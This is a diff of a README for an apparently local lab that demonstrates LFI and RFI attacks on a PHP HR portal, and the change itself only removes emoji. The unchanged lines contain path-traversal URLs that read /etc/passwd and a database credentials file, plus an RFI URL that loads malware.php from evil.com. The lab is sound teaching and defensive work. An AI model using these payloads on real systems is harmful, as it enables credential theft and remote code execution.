@@ -179,7 +179,7 @@ exit;
 php /var/www/html/hr_portal/db.php
 ```
 
-If nothing appears = connection is working ✅
+If nothing appears = connection is working 
 
 ---
 
@@ -203,7 +203,7 @@ If nothing appears = connection is working ✅
 
 ## LFI Attack Demo
 
-### Vulnerable Page — Attack Succeeds ❌
+### Vulnerable Page — Attack Succeeds 
 
 ```
 http://localhost/hr_portal/view.php?file=../../../../etc/passwd
@@ -215,7 +215,7 @@ http://localhost/hr_portal/view.php?file=../db.php
 ```
 Result: Exposes database credentials
 
-### Secure Page — Attack Blocked ✅
+### Secure Page — Attack Blocked 
 
 ```
 http://localhost/hr_portal/view_secure.php?file=../../../../etc/passwd
@@ -227,7 +227,7 @@ http://localhost/hr_portal/view_secure.php?file=../db.php
 ```
 Result: Access Denied — LFI Attack Blocked!
 
-### RFI Attack — Failed (Server Configuration) ❌
+### RFI Attack — Failed (Server Configuration) 
 
 ```
 http://localhost/hr_portal/view.php?file=http://evil.com/malware.php
